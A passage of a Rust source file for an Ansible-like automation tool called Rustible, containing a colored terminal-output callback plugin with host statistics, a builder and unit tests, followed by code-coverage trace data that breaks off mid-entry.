u32,\n    /// Tasks that were skipped\n    pub skipped: u32,\n    /// Tasks where host was unreachable\n    pub unreachable: u32,\n    /// Tasks that were rescued from failure\n    pub rescued: u32,\n    /// Tasks whose failures were ignored\n    pub ignored: u32,\n}\n\nimpl HostStats {\n    /// Create new empty statistics\n    pub fn new() -\u003e Self {\n        Self::default()\n    }\n\n    /// Check if there were any failures\n    pub fn has_failures(\u0026self) -\u003e bool {\n        self.failed \u003e 0 || self.unreachable \u003e 0\n    }\n\n    /// Check if there were any changes\n    pub fn has_changes(\u0026self) -\u003e bool {\n        self.changed \u003e 0\n    }\n\n    /// Get total task count\n    pub fn total(\u0026self) -\u003e u32 {\n        self.ok\n            + self.changed\n            + self.failed\n            + self.skipped\n            + self.unreachable\n            + self.rescued\n            + self.ignored\n    }\n}\n\n// ============================================================================\n// Default Callback Configuration\n// ============================================================================\n\n/// Configuration for the DefaultCallback plugin\n#[derive(Debug, Clone)]\npub struct DefaultCallbackConfig {\n    /// Verbosity level (0-5, corresponding to -v flags)\n    pub verbosity: u8,\n    /// Whether to disable colored output\n    pub no_color: bool,\n    /// Whether to show diffs for changed files\n    pub show_diff: bool,\n    /// Whether to show task duration\n    pub show_duration: bool,\n    /// Whether to show skipped tasks\n    pub show_skipped: bool,\n    /// Whether to show ok tasks (can be noisy for large playbooks)\n    pub show_ok: bool,\n}\n\nimpl Default for DefaultCallbackConfig {\n    fn default() -\u003e Self {\n        Self {\n            verbosity: 0,\n            no_color: false,\n            show_diff: false,\n            show_duration: true,\n            show_skipped: true,\n            show_ok: true,\n        }\n    }\n}\n\n// ============================================================================\n// Default Callback Implementation\n// ============================================================================\n\n/// Default callback plugin producing Ansible-like colored output.\n///\n/// This is the primary callback plugin for Rustible, designed to produce\n/// output that is familiar to Ansible users while respecting terminal\n/// capabilities and CI environment constraints.\n///\n/// # Thread Safety\n///\n/// The callback is thread-safe and can be used with concurrent task execution.\n/// All mutable state is protected by `RwLock` or atomic types.\n///\n/// # Example\n///\n/// ```rust,ignore\n/// use rustible::callback::plugins::DefaultCallback;\n///\n/// let callback = DefaultCallback::new();\n/// executor.with_callback(Box::new(callback));\n/// ```\n#[derive(Debug)]\npub struct DefaultCallback {\n    /// Configuration\n    config: DefaultCallbackConfig,\n    /// Whether to use colored output (computed from config and environment)\n    use_color: AtomicBool,\n    /// Current verbosity level\n    verbosity: AtomicU8,\n    /// Playbook start time\n    playbook_start: RwLock\u003cOption\u003cInstant\u003e\u003e,\n    /// Current playbook name\n    playbook_name: RwLock\u003cOption\u003cString\u003e\u003e,\n    /// Current play name\n    current_play: RwLock\u003cOption\u003cString\u003e\u003e,\n    /// Current task name (for header deduplication)\n    current_task: RwLock\u003cOption\u003cString\u003e\u003e,\n    /// Task start times for duration tracking\n    task_starts: RwLock\u003cHashMap\u003cString, Instant\u003e\u003e,\n    /// Per-host statistics\n    host_stats: RwLock\u003cHashMap\u003cString, HostStats\u003e\u003e,\n    /// Whether we've already printed the task header (to avoid duplicates)\n    task_header_printed: AtomicBool,\n}\n\nimpl DefaultCallback {\n    /// Create a new DefaultCallback with default settings.\n    ///\n    /// # Example\n    ///\n    /// ```rust,ignore\n    /// let callback = DefaultCallback::new();\n    /// ```\n    pub fn new() -\u003e Self {\n        Self::with_config(DefaultCallbackConfig::default())\n    }\n\n    /// Create a new DefaultCallback with custom configuration.\n    ///\n    /// # Arguments\n    ///\n    /// * `config` - Configuration options\n    ///\n    /// # Example\n    ///\n    /// ```rust,ignore\n    /// let config = DefaultCallbackConfig {\n    ///     verbosity: 2,\n    ///     no_color: true,\n    ///     ..Default::default()\n    /// };\n    /// let callback = DefaultCallback::with_config(config);\n    /// ```\n    pub fn with_config(config: DefaultCallbackConfig) -\u003e Self {\n        // Respect NO_COLOR environment variable\n        let use_color = !config.no_color \u0026\u0026 std::env::var(\"NO_COLOR\").is_err();\n\n        Self {\n            verbosity: AtomicU8::new(config.verbosity),\n            use_color: AtomicBool::new(use_color),\n            config,\n            playbook_start: RwLock::new(None),\n            playbook_name: RwLock::new(None),\n            current_play: RwLock::new(None),\n            current_task: RwLock::new(None),\n            task_starts: RwLock::new(HashMap::new()),\n            host_stats: RwLock::new(HashMap::new()),\n            task_header_printed: AtomicBool::new(false),\n        }\n    }\n\n    /// Set the verbosity level.\n    ///\n    /// # Arguments\n    ///\n    /// * `level` - Verbosity level (0-5)\n    pub fn with_verbosity(self, level: u8) -\u003e Self {\n        self.verbosity.store(level, Ordering::Relaxed);\n        self\n    }\n\n    /// Enable or disable colored output.\n    ///\n    /// # Arguments\n    ///\n    /// * `no_color` - If true, disable colors\n    pub fn with_no_color(self, no_color: bool) -\u003e Self {\n        let use_color = !no_color \u0026\u0026 std::env::var(\"NO_COLOR\").is_err();\n        self.use_color.store(use_color, Ordering::Relaxed);\n        self\n    }\n\n    /// Get the builder for this callback.\n    pub fn builder() -\u003e DefaultCallbackBuilder {\n        DefaultCallbackBuilder::new()\n    }\n\n    // ========================================================================\n    // Output Helpers\n    // ========================================================================\n\n    /// Check if colors are enabled\n    fn use_color(\u0026self) -\u003e bool {\n        self.use_color.load(Ordering::Relaxed)\n    }\n\n    /// Get current verbosity level\n    fn verbosity(\u0026self) -\u003e Verbosity {\n        Verbosity::from(self.verbosity.load(Ordering::Relaxed))\n    }\n\n    /// Print a header line with asterisks (Ansible style).\n    ///\n    /// Format: `PREFIX [name] ******...`\n    fn print_header(\u0026self, prefix: \u0026str, name: \u0026str) {\n        let header = format!(\"{} [{}]\", prefix, name);\n        let padding = OUTPUT_WIDTH.saturating_sub(header.len() + 1);\n        let stars = \"*\".repeat(padding);\n\n        if self.use_color() {\n            println!(\n                \"\\n{} {}\",\n                header.bright_white().bold(),\n                stars.bright_black()\n            );\n        } else {\n            println!(\"\\n{} {}\", header, stars);\n        }\n    }\n\n    /// Print the PLAY RECAP header\n    fn print_recap_header(\u0026self) {\n        let header = \"PLAY RECAP\";\n        let padding = OUTPUT_WIDTH.saturating_sub(header.len() + 1);\n        let stars = \"*\".repeat(padding);\n\n        if self.use_color() {\n            println!(\n                \"\\n{} {}\",\n                header.bright_white().bold(),\n                stars.bright_black()\n            );\n        } else {\n            println!(\"\\n{} {}\", header, stars);\n        }\n    }\n\n    /// Format a status string with color\n    fn format_status(\u0026self, result: \u0026ModuleResult) -\u003e String {\n        let (text, color) = if result.skipped {\n            (\"skipping\", Color::Cyan)\n        } else if !result.success {\n            (\"fatal\", Color::Red)\n        } else if result.changed {\n            (\"changed\", Color::Yellow)\n        } else {\n            (\"ok\", Color::Green)\n        };\n\n        if self.use_color() {\n            text.color(color).to_string()\n        } else {\n            text.to_string()\n        }\n    }\n\n    /// Format a host name with color based on result\n    fn format_host(\u0026self, host: \u0026str, result: \u0026ModuleResult) -\u003e String {\n        if self.use_color() {\n            if !result.success {\n                host.red().bold().to_string()\n            } else {\n                host.bright_white().bold().to_string()\n            }\n        } else {\n            host.to_string()\n        }\n    }\n\n    /// Format host name for recap based on overall stats\n    fn format_recap_host(\u0026self, host: \u0026str, stats: \u0026HostStats) -\u003e String {\n        if self.use_color() {\n            if stats.has_failures() {\n                host.red().bold().to_string()\n            } else if stats.has_changes() {\n                host.yellow().to_string()\n            } else {\n                host.green().to_string()\n            }\n        } else {\n            host.to_string()\n        }\n    }\n\n    /// Format a stat value for recap (dimmed if zero)\n    fn format_stat(\u0026self, label: \u0026str, value: u32, color: Color) -\u003e String {\n        if self.use_color() {\n            if value \u003e 0 {\n                format!(\n                    \"{}={}\",\n                    label.color(color),\n                    value.to_string().color(color).bold()\n                )\n            } else {\n                format!(\"{}={}\", label, value).dimmed().to_string()\n            }\n        } else {\n            format!(\"{}={}\", label, value)\n        }\n    }\n\n    /// Format duration for display\n    fn format_duration(duration: Duration) -\u003e String {\n        let secs = duration.as_secs();\n        let millis = duration.subsec_millis();\n\n        if secs \u003e= 3600 {\n            let hours = secs / 3600;\n            let mins = (secs % 3600) / 60;\n            let secs = secs % 60;\n            format!(\"{}h {}m {}s\", hours, mins, secs)\n        } else if secs \u003e= 60 {\n            let mins = secs / 60;\n            let secs = secs % 60;\n            format!(\"{}m {}s\", mins, secs)\n        } else if secs \u003e 0 {\n            format!(\"{}.{:02}s\", secs, millis / 10)\n        } else {\n            format!(\"{}ms\", millis)\n        }\n    }\n\n    /// Print verbose result details (controlled by verbosity level)\n    fn print_verbose_result(\u0026self, result: \u0026ExecutionResult) {\n        if self.verbosity() \u003c Verbosity::Verbose {\n            return;\n        }\n\n        // -v: Show message if present\n        if !result.result.message.is_empty() {\n            if self.use_color() {\n                println!(\"    {}: {}\", \"msg\".bright_black(), result.result.message);\n            } else {\n                println!(\"    msg: {}\", result.result.message);\n            }\n        }\n\n        // -vv: Show result data\n        if self.verbosity() \u003e= Verbosity::MoreVerbose {\n            if let Some(ref data) = result.result.data {\n                let json_str = serde_json::to_string_pretty(data).unwrap_or_default();\n                for line in json_str.lines() {\n                    if self.use_color() {\n                        println!(\"    {}\", line.bright_black());\n                    } else {\n                        println!(\"    {}\", line);\n                    }\n                }\n            }\n        }\n\n        // Show duration if configured\n        if self.config.show_duration {\n            if self.use_color() {\n                println!(\n                    \"    {}: {}\",\n                    \"duration\".bright_black(),\n                    Self::format_duration(result.duration).bright_black()\n                );\n            } else {\n                println!(\"    duration: {}\", Self::format_duration(result.duration));\n            }\n        }\n    }\n\n    /// Create a task key for tracking\n    fn task_key(task_name: \u0026str, host: \u0026str) -\u003e String {\n        format!(\"{}:{}\", task_name, host)\n    }\n}\n\nimpl Default for DefaultCallback {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\nimpl Clone for DefaultCallback {\n    fn clone(\u0026self) -\u003e Self {\n        Self {\n            config: self.config.clone(),\n            use_color: AtomicBool::new(self.use_color.load(Ordering::Relaxed)),\n            verbosity: AtomicU8::new(self.verbosity.load(Ordering::Relaxed)),\n            playbook_start: RwLock::new(*self.playbook_start.read()),\n            playbook_name: RwLock::new(self.playbook_name.read().clone()),\n            current_play: RwLock::new(self.current_play.read().clone()),\n            current_task: RwLock::new(self.current_task.read().clone()),\n            task_starts: RwLock::new(self.task_starts.read().clone()),\n            host_stats: RwLock::new(self.host_stats.read().clone()),\n            task_header_printed: AtomicBool::new(self.task_header_printed.load(Ordering::Relaxed)),\n        }\n    }\n}\n\n// ============================================================================\n// ExecutionCallback Implementation\n// ============================================================================\n\n#[async_trait]\nimpl ExecutionCallback for DefaultCallback {\n    async fn on_playbook_start(\u0026self, name: \u0026str) {\n        // Reset state\n        *self.playbook_start.write() = Some(Instant::now());\n        *self.playbook_name.write() = Some(name.to_string());\n        self.host_stats.write().clear();\n        self.task_starts.write().clear();\n\n        if self.verbosity() \u003e= Verbosity::Verbose {\n            if self.use_color() {\n                println!(\n                    \"\\n{} {}\",\n                    \"PLAYBOOK:\".bright_white().bold(),\n                    name.bright_white()\n                );\n            } else {\n                println!(\"\\nPLAYBOOK: {}\", name);\n            }\n        }\n    }\n\n    async fn on_playbook_end(\u0026self, _name: \u0026str, success: bool) {\n        // Print recap\n        self.print_recap_header();\n\n        let stats = self.host_stats.read();\n\n        // Sort hosts for consistent output\n        let mut hosts: Vec\u003c_\u003e = stats.keys().collect();\n        hosts.sort();\n\n        for host in hosts {\n            if let Some(host_stats) = stats.get(host) {\n                let host_colored = self.format_recap_host(host, host_stats);\n\n                // Format each stat\n                let ok = self.format_stat(\"ok\", host_stats.ok, Color::Green);\n                let changed = self.format_stat(\"changed\", host_stats.changed, Color::Yellow);\n                let unreachable =\n                    self.format_stat(\"unreachable\", host_stats.unreachable, Color::Red);\n                let failed = self.format_stat(\"failed\", host_stats.failed, Color::Red);\n                let skipped = self.format_stat(\"skipped\", host_stats.skipped, Color::Cyan);\n                let rescued = self.format_stat(\"rescued\", host_stats.rescued, Color::Magenta);\n                let ignored = self.format_stat(\"ignored\", host_stats.ignored, Color::Blue);\n\n                println!(\n                    \"{:\u003c30} : {}    {}    {}    {}    {}    {}    {}\",\n                    host_colored, ok, changed, unreachable, failed, skipped, rescued, ignored\n                );\n            }\n        }\n\n        // Print total duration\n        if let Some(start) = *self.playbook_start.read() {\n            let duration = start.elapsed();\n            let duration_str = Self::format_duration(duration);\n\n            let status = if success {\n                if self.use_color() {\n                    \"completed\".green().bold().to_string()\n                } else {\n                    \"completed\".to_string()\n                }\n            } else {\n                if self.use_color() {\n                    \"failed\".red().bold().to_string()\n                } else {\n                    \"failed\".to_string()\n                }\n            };\n\n            println!();\n            if self.use_color() {\n                println!(\"Playbook {} in {}\", status, duration_str.bright_white());\n            } else {\n                println!(\"Playbook {} in {}\", status, duration_str);\n            }\n        }\n\n        let _ = io::stdout().flush();\n    }\n\n    async fn on_play_start(\u0026self, name: \u0026str, hosts: \u0026[String]) {\n        *self.current_play.write() = Some(name.to_string());\n\n        // Initialize stats for all hosts\n        {\n            let mut stats = self.host_stats.write();\n            for host in hosts {\n                stats.entry(host.clone()).or_default();\n            }\n        }\n\n        self.print_header(\"PLAY\", name);\n    }\n\n    async fn on_play_end(\u0026self, _name: \u0026str, _success: bool) {\n        *self.current_play.write() = None;\n    }\n\n    async fn on_task_start(\u0026self, name: \u0026str, host: \u0026str) {\n        let key = Self::task_key(name, host);\n        self.task_starts.write().insert(key, Instant::now());\n\n        // Only print the task header once (for the first host)\n        let current = self.current_task.read().clone();\n        if current.as_deref() != Some(name) {\n            *self.current_task.write() = Some(name.to_string());\n            self.task_header_printed.store(false, Ordering::Relaxed);\n        }\n\n        if !self.task_header_printed.swap(true, Ordering::Relaxed) {\n            self.print_header(\"TASK\", name);\n        }\n    }\n\n    async fn on_task_complete(\u0026self, result: \u0026ExecutionResult) {\n        // Update host stats\n        {\n            let mut stats = self.host_stats.write();\n            let host_stats = stats.entry(result.host.clone()).or_default();\n\n            if result.result.skipped {\n                host_stats.skipped += 1;\n            } else if !result.result.success {\n                host_stats.failed += 1;\n            } else if result.result.changed {\n                host_stats.changed += 1;\n            } else {\n                host_stats.ok += 1;\n            }\n        }\n\n        // Check if we should display this result\n        if result.result.skipped \u0026\u0026 !self.config.show_skipped {\n            return;\n        }\n        if result.result.success \u0026\u0026 !result.result.changed \u0026\u0026 !self.config.show_ok {\n            return;\n        }\n\n        let status_str = self.format_status(\u0026result.result);\n        let host_str = self.format_host(\u0026result.host, \u0026result.result);\n\n        // Format the result line\n        if result.result.skipped || (result.result.success \u0026\u0026 !result.result.changed) {\n            // ok/skipped: simple format\n            println!(\"{}: [{}]\", status_str, host_str);\n        } else if result.result.changed {\n            // changed: show message if brief\n            print!(\"{}: [{}]\", status_str, host_str);\n            if self.verbosity() \u003e= Verbosity::Verbose \u0026\u0026 !result.result.message.is_empty() {\n                if self.use_color() {\n                    print!(\" =\u003e {}\", result.result.message.bright_black());\n                } else {\n                    print!(\" =\u003e {}\", result.result.message);\n                }\n            }\n            println!();\n        } else {\n            // failed: always show message and details\n            print!(\"{}: [{}]\", status_str, host_str);\n\n            if !result.result.message.is_empty() {\n                if self.use_color() {\n                    print!(\" =\u003e {}\", format!(\"{{{}}}\", result.result.message).red());\n                } else {\n                    print!(\" =\u003e {{{}}}\", result.result.message);\n                }\n            }\n\n            println!();\n\n            // Show full result for failures at any verbosity\n            if let Some(ref data) = result.result.data {\n                let json_str = serde_json::to_string_pretty(data).unwrap_or_default();\n                for line in json_str.lines() {\n                    if self.use_color() {\n                        println!(\"    {}\", line.red());\n                    } else {\n                        println!(\"    {}\", line);\n                    }\n                }\n            }\n        }\n\n        // Show verbose output\n        self.print_verbose_result(result);\n\n        let _ = io::stdout().flush();\n    }\n\n    async fn on_handler_triggered(\u0026self, name: \u0026str) {\n        if self.verbosity() \u003e= Verbosity::Verbose {\n            if self.use_color() {\n                println!(\n                    \"{} {}\",\n                    \"RUNNING HANDLER\".bright_white().bold(),\n                    format!(\"[{}]\", name).bright_white()\n                );\n            } else {\n                println!(\"RUNNING HANDLER [{}]\", name);\n            }\n        }\n    }\n\n    async fn on_facts_gathered(\u0026self, host: \u0026str, _facts: \u0026Facts) {\n        if self.verbosity() \u003e= Verbosity::Debug {\n            if self.use_color() {\n                println!(\"{}: [{}]\", \"ok\".green(), host.bright_white().bold());\n            } else {\n                println!(\"ok: [{}]\", host);\n            }\n        }\n    }\n}\n\n// ============================================================================\n// Builder Pattern\n// ============================================================================\n\n/// Builder for DefaultCallback with fluent configuration.\n#[derive(Debug, Clone, Default)]\npub struct DefaultCallbackBuilder {\n    config: DefaultCallbackConfig,\n}\n\nimpl DefaultCallbackBuilder {\n    /// Create a new builder with default settings.\n    pub fn new() -\u003e Self {\n        Self {\n            config: DefaultCallbackConfig::default(),\n        }\n    }\n\n    /// Set the verbosity level (0-5).\n    pub fn verbosity(mut self, level: u8) -\u003e Self {\n        self.config.verbosity = level;\n        self\n    }\n\n    /// Disable colored output.\n    pub fn no_color(mut self, no_color: bool) -\u003e Self {\n        self.config.no_color = no_color;\n        self\n    }\n\n    /// Enable diff mode for showing file changes.\n    pub fn show_diff(mut self, show_diff: bool) -\u003e Self {\n        self.config.show_diff = show_diff;\n        self\n    }\n\n    /// Enable or disable duration display.\n    pub fn show_duration(mut self, show: bool) -\u003e Self {\n        self.config.show_duration = show;\n        self\n    }\n\n    /// Enable or disable showing skipped tasks.\n    pub fn show_skipped(mut self, show: bool) -\u003e Self {\n        self.config.show_skipped = show;\n        self\n    }\n\n    /// Enable or disable showing ok tasks.\n    pub fn show_ok(mut self, show: bool) -\u003e Self {\n        self.config.show_ok = show;\n        self\n    }\n\n    /// Build the DefaultCallback.\n    pub fn build(self) -\u003e DefaultCallback {\n        DefaultCallback::with_config(self.config)\n    }\n}\n\n// ============================================================================\n// Unit Tests\n// ============================================================================\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_default_callback_creation() {\n        let callback = DefaultCallback::new();\n        assert_eq!(callback.verbosity(), Verbosity::Normal);\n    }\n\n    #[test]\n    fn test_default_callback_with_verbosity() {\n        let callback = DefaultCallback::new().with_verbosity(2);\n        assert_eq!(callback.verbosity(), Verbosity::MoreVerbose);\n    }\n\n    #[test]\n    fn test_default_callback_no_color() {\n        let callback = DefaultCallback::new().with_no_color(true);\n        assert!(!callback.use_color());\n    }\n\n    #[test]\n    fn test_builder_pattern() {\n        let callback = DefaultCallbackBuilder::new()\n            .verbosity(2)\n            .no_color(true)\n            .show_diff(true)\n            .show_duration(false)\n            .build();\n\n        assert_eq!(callback.verbosity(), Verbosity::MoreVerbose);\n        assert!(!callback.use_color());\n        assert!(callback.config.show_diff);\n        assert!(!callback.config.show_duration);\n    }\n\n    #[test]\n    fn test_verbosity_from_u8() {\n        assert_eq!(Verbosity::from(0), Verbosity::Normal);\n        assert_eq!(Verbosity::from(1), Verbosity::Verbose);\n        assert_eq!(Verbosity::from(2), Verbosity::MoreVerbose);\n        assert_eq!(Verbosity::from(3), Verbosity::Debug);\n        assert_eq!(Verbosity::from(4), Verbosity::ConnectionDebug);\n        assert_eq!(Verbosity::from(5), Verbosity::WinRMDebug);\n        assert_eq!(Verbosity::from(10), Verbosity::WinRMDebug); // Clamps to max\n    }\n\n    #[test]\n    fn test_format_duration() {\n        assert_eq!(\n            DefaultCallback::format_duration(Duration::from_millis(500)),\n            \"500ms\"\n        );\n        assert_eq!(\n            DefaultCallback::format_duration(Duration::from_secs(5)),\n            \"5.00s\"\n        );\n        assert_eq!(\n            DefaultCallback::format_duration(Duration::from_secs(65)),\n            \"1m 5s\"\n        );\n        assert_eq!(\n            DefaultCallback::format_duration(Duration::from_secs(3665)),\n            \"1h 1m 5s\"\n        );\n    }\n\n    #[test]\n    fn test_host_stats() {\n        let mut stats = HostStats::new();\n\n        assert_eq!(stats.total(), 0);\n        assert!(!stats.has_failures());\n        assert!(!stats.has_changes());\n\n        stats.ok = 5;\n        stats.changed = 2;\n        stats.failed = 1;\n\n        assert_eq!(stats.total(), 8);\n        assert!(stats.has_failures());\n        assert!(stats.has_changes());\n    }\n\n    #[test]\n    fn test_task_key() {\n        let key = DefaultCallback::task_key(\"Install nginx\", \"webserver1\");\n        assert_eq!(key, \"Install nginx:webserver1\");\n    }\n\n    #[test]\n    fn test_clone() {\n        let callback1 = DefaultCallback::new().with_verbosity(3);\n        let callback2 = callback1.clone();\n\n        assert_eq!(callback2.verbosity(), Verbosity::Debug);\n    }\n\n    #[test]\n    fn test_default() {\n        let callback = DefaultCallback::default();\n        assert_eq!(callback.verbosity(), Verbosity::Normal);\n        assert!(callback.playbook_name.read().is_none());\n    }\n\n    #[tokio::test]\n    async fn test_callback_lifecycle() {\n        let callback = DefaultCallback::builder()\n            .no_color(true)\n            .show_ok(false)\n            .show_skipped(false)\n            .build();\n\n        // Start playbook\n        callback.on_playbook_start(\"test_playbook\").await;\n        assert!(callback.playbook_start.read().is_some());\n        assert_eq!(\n            callback.playbook_name.read().as_ref().map(|s| s.as_str()),\n            Some(\"test_playbook\")\n        );\n\n        // Start play\n        callback\n            .on_play_start(\"test_play\", \u0026[\"host1\".to_string(), \"host2\".to_string()])\n            .await;\n        assert_eq!(\n            callback.current_play.read().as_ref().map(|s| s.as_str()),\n            Some(\"test_play\")\n        );\n\n        // Verify hosts are initialized\n        let stats = callback.host_stats.read();\n        assert!(stats.contains_key(\"host1\"));\n        assert!(stats.contains_key(\"host2\"));\n        drop(stats);\n\n        // Start task\n        callback.on_task_start(\"Install nginx\", \"host1\").await;\n        assert_eq!(\n            callback.current_task.read().as_ref().map(|s| s.as_str()),\n            Some(\"Install nginx\")\n        );\n\n        // Complete task\n        let result = ExecutionResult {\n            host: \"host1\".to_string(),\n            task_name: \"Install nginx\".to_string(),\n            result: ModuleResult::changed(\"Installed\"),\n            duration: Duration::from_millis(500),\n            notify: vec![],\n        };\n        callback.on_task_complete(\u0026result).await;\n\n        // Verify stats updated\n        let stats = callback.host_stats.read();\n        assert_eq!(stats.get(\"host1\").map(|s| s.changed), Some(1));\n        drop(stats);\n\n        // End play\n        callback.on_play_end(\"test_play\", true).await;\n        assert!(callback.current_play.read().is_none());\n\n        // End playbook\n        callback.on_playbook_end(\"test_playbook\", true).await;\n    }\n\n    #[tokio::test]\n    async fn test_host_stats_tracking() {\n        let callback = DefaultCallback::builder()\n            .no_color(true)\n            .show_ok(false)\n            .show_skipped(false)\n            .build();\n\n        callback.on_playbook_start(\"test\").await;\n        callback\n            .on_play_start(\"test_play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        // OK result\n        let ok_result = ExecutionResult {\n            host: \"host1\".to_string(),\n            task_name: \"task1\".to_string(),\n            result: ModuleResult::ok(\"OK\"),\n            duration: Duration::from_millis(100),\n            notify: vec![],\n        };\n        callback.on_task_complete(\u0026ok_result).await;\n\n        // Changed result\n        let changed_result = ExecutionResult {\n            host: \"host1\".to_string(),\n            task_name: \"task2\".to_string(),\n            result: ModuleResult::changed(\"Changed\"),\n            duration: Duration::from_millis(100),\n            notify: vec![],\n        };\n        callback.on_task_complete(\u0026changed_result).await;\n\n        // Failed result\n        let failed_result = ExecutionResult {\n            host: \"host1\".to_string(),\n            task_name: \"task3\".to_string(),\n            result: ModuleResult::failed(\"Failed\"),\n            duration: Duration::from_millis(100),\n            notify: vec![],\n        };\n        callback.on_task_complete(\u0026failed_result).await;\n\n        // Skipped result\n        let skipped_result = ExecutionResult {\n            host: \"host1\".to_string(),\n            task_name: \"task4\".to_string(),\n            result: ModuleResult::skipped(\"Skipped\"),\n            duration: Duration::from_millis(100),\n            notify: vec![],\n        };\n        callback.on_task_complete(\u0026skipped_result).await;\n\n        let stats = callback.host_stats.read();\n        let host_stats = stats.get(\"host1\").unwrap();\n\n        assert_eq!(host_stats.ok, 1);\n        assert_eq!(host_stats.changed, 1);\n        assert_eq!(host_stats.failed, 1);\n        assert_eq!(host_stats.skipped, 1);\n        assert!(host_stats.has_failures());\n        assert!(host_stats.has_changes());\n    }\n}\n","traces":[{"line":101,"address":[31180160],"length":1,"stats":{"Line":1}},{"line":102,"address":[31180167],"length":1,"stats":{"Line":1}},{"line":103,"address":[31180207],"length":1,"stats":{"Line":1}},{"line":104,"address":[31180214],"length":1,"stats":{"Line":1}},{"line":105,"address":[31180221],"length":1,"stats":{"Line":1}},{"line":106,"address":[31180228],"length":1,"stats":{"Line":1}},{"line":107,"address":[31180235],"length":1,"stats":{"Line":1}},{"line":108,"address":[31180200],"length":1,"stats":{"Line":1}},{"line":138,"address":[31176912],"length":1,"stats":{"Line":1}},{"line":139,"address":[31176920],"length":1,"stats":{"Line":1}},{"line":143,"address":[31176864],"length":1,"stats":{"Line":1}},{"line":144,"address":[31176874],"length":1,"stats":{"Line":1}},{"line":148,"address":[31176848],"length":1,"stats":{"Line":1}},{"line":149,"address":[31176853],"length":1,"stats":{"Line":1}},{"line":153,"address":[31176944],"length":1,"stats":{"Line":1}},{"line":154,"address":[31177167,31176958],"length":1,"stats":{"Line":1}},{"line":253,"address":[31175584],"length":1,"stats":{"Line":1}},{"line":254,"address":[31175597],"length":1,"stats":{"Line":1}},{"line":273,"address":[31168535,31168541,31168208],"length":1,"stats":{"Line":1}},{"line":275,"address":[31168261],"length":1,"stats":{"Line":1}},{"line":278,"address":[31168384],"length":1,"stats":{"Line":1}},{"line":279,"address":[31168412],"length":1,"stats":{"Line":1}},{"line":281,"address":[31168450],"length":1,"stats":{"Line":1}},{"line":282,"address":[31168470],"length":1,"stats":{"Line":1}},{"line":283,"address":[31168504],"length":1,"stats":{"Line":1}},{"line":284,"address":[31168601],"length":1,"stats":{"Line":1}},{"line":285,"address":[31168677,31168737],"length":1,"stats":{"Line":2}},{"line":286,"address":[31168752,31168812],"length":1,"stats":{"Line":2}},{"line":287,"address":[31168878,31168821],"length":1,"stats":{"Line":2}},{"line":296,"address":[31171166,31171056],"length":1,"stats":{"Line":1}},{"line":297,"address":[31171089],"length":1,"stats":{"Line":1}},{"line":298,"address":[31171146],"length":1,"stats":{"Line":1}},{"line":306,"address":[31171000,31170800,31171036],"length":1,"stats":{"Line":1}},{"line":307,"address":[31170830,31170905],"length":1,"stats":{"Line":1}},{"line":308,"address":[31170979],"length":1,"stats":{"Line":1}},{"line":309,"address":[31171016],"length":1,"stats":{"Line":1}},{"line":313,"address":[31175696],"length":1,"stats":{"Line":1}},{"line":314,"address":[31175700],"length":1,"stats":{"Line":1}},{"line":322,"address":[31176000],"length":1,"stats":{"Line":1}},{"line":323,"address":[31176005],"length":1,"stats":{"Line":1}},{"line":327,"address":[31176032],"length":1,"stats":{"Line":1}},{"line":328,"address":[31176037],"length":1,"stats":{"Line":1}},{"line":334,"address":[31170319,31169200,31170313],"length":1,"stats":{"Line":1}},{"line":335,"address":[31169251],"length":1,"stats":{"Line":1}},{"line":336,"address":[31169507,31169446],"length":1,"stats":{"Line":2}},{"line":337,"address":[31169579],"length":1,"stats":{"Line":1}},{"line":339,"address":[31169670,31169611],"length":1,"stats":{"Line":2}},{"line":340,"address":[31170051,31169971],"length":1,"stats":{"Line":0}},{"line":346,"address":[31169684,31169755],"length":1,"stats":{"Line":2}},{"line":351,"address":[31173591,31172816,31173597],"length":1,"stats":{"Line":1}},{"line":352,"address":[31172836],"length":1,"stats":{"Line":1}},{"line":353,"address":[31172956,31172857],"length":1,"stats":{"Line":1}},{"line":354,"address":[31172918],"length":1,"stats":{"Line":1}},{"line":356,"address":[31173014,31172945],"length":1,"stats":{"Line":2}},{"line":357,"address":[31173227,31173065],"length":1,"stats":{"Line":0}},{"line":363,"address":[31173097,31173025],"length":1,"stats":{"Line":2}},{"line":368,"address":[31170781,31170787,31170336],"length":1,"stats":{"Line":1}},{"line":369,"address":[31170379,31170488,31170432],"length":1,"stats":{"Line":2}},{"line":370,"address":[31170398],"length":1,"stats":{"Line":0}},{"line":371,"address":[31170390,31170468],"length":1,"stats":{"Line":2}},{"line":372,"address":[31170434],"length":1,"stats":{"Line":1}},{"line":373,"address":[31170475,31170577,31170613],"length":1,"stats":{"Line":2}},{"line":374,"address":[31170579],"length":1,"stats":{"Line":1}},{"line":376,"address":[31170543],"length":1,"stats":{"Line":0}},{"line":379,"address":[31170532],"length":1,"stats":{"Line":1}},{"line":380,"address":[31170651],"length":1,"stats":{"Line":0}},{"line":382,"address":[31170633],"length":1,"stats":{"Line":1}},{"line":387,"address":[31166834,31166496,31166840],"length":1,"stats":{"Line":1}},{"line":388,"address":[31166573],"length":1,"stats":{"Line":1}},{"line":389,"address":[31166610],"length":1,"stats":{"Line":0}},{"line":390,"address":[31166641],"length":1,"stats":{"Line":0}},{"line":392,"address":[31166714],"length":1,"stats":{"Line":0}},{"line":395,"address":[31166597],"length":1,"stats":{"Line":1}},{"line":400,"address":[31172288,31172676,31172682],"length":1,"stats":{"Line":1}},{"line":401,"address":[31172365],"length":1,"stats":{"Line":1}},{"line":402,"address":[31172402],"length":1,"stats":{"Line":0}},{"line":403,"address":[31172452],"length":1,"stats":{"Line":0}},{"line":404,"address":[31172793,31172431,31172755],"length":1,"stats":{"Line":0}},{"line":405,"address":[31172577],"length":1,"stats":{"Line":0}},{"line":407,"address":[31172528],"length":1,"stats":{"Line":0}},{"line":410,"address":[31172389],"length":1,"stats":{"Line":1}},{"line":415,"address":[31166928,31167704,31167710],"length":1,"stats":{"Line":1}},{"line":416,"address":[31166994],"length":1,"stats":{"Line":1}},{"line":417,"address":[31167206],"length":1,"stats":{"Line":0}},{"line":418,"address":[31167723,31167788,31167924],"length":1,"stats":{"Line":0}},{"line":420,"address":[31167446],"length":1,"stats":{"Line":0}},{"line":421,"address":[31167505,31167772,31167838],"length":1,"stats":{"Line":0}},{"line":424,"address":[31167586,31167237],"length":1,"stats":{"Line":0}},{"line":427,"address":[31167007],"length":1,"stats":{"Line":1}},{"line":432,"address":[31171184],"length":1,"stat